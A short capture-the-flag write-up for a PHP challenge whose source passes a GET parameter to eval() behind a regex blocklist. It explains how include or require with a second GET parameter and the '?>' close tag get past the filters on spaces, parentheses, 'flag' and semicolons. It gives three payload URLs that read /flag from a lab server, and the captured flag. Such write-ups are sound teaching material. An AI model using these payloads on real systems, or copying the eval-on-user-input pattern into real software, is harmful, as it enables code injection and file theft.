```php
$cmd = $_GET['cmd'];

if(isset($cmd)){
    if(!preg_match("/echo|flag|system|php|cat|shell|\.| |\'|\`|\;|\(/i", $cmd)){
        eval($cmd);
    }
    
}else{
    highlight_file(__FILE__);
}

// $flag = "/flag";
```

1- to bypass `space` and `parentheses` filter we need to use functions that does not require parentheses (i.e: print, include, require ...)

2- to bypass `flag` filter we need to add second argument, as we can see `$` and `_` chars are allowed for `$_GET, $_REQUEST` use. (in all cases we need a dollar sign to declare that we end our func name and we are reading data from a var)

3- to bypass `semicolon` filter we gonna need the php close tag `?>` to end the script.

payload :

`http://18.192.38.21:3333/?cmd=include$_GET[0]?>&0=/flag`

`http://18.192.38.21:3333/?cmd=require$_GET[0]?>&0=/flag`

`http://18.192.38.21:3333/?cmd=require_once$_GET[0]?>&0=/flag`

__FLAG{EZZ_PHP_C0DE_BYP@SS}__